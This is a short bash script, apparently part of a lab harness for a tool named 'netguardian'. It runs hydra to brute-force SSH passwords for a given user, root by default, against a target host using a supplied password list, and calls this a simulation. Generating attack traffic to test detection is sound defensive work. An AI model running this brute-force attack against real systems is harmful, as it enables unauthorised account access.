#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST="${1:-agent}"
USER_NAME="${2:-root}"
PASS_FILE="${3:-/tmp/pass.txt}"

if [[ ! -f "${PASS_FILE}" ]]; then
  echo "Password list not found: ${PASS_FILE}" >&2
  exit 1
fi

echo "[netguardian] Starting SSH brute-force simulation against ${TARGET_HOST} as ${USER_NAME}"
exec hydra -l "${USER_NAME}" -P "${PASS_FILE}" "ssh://${TARGET_HOST}"
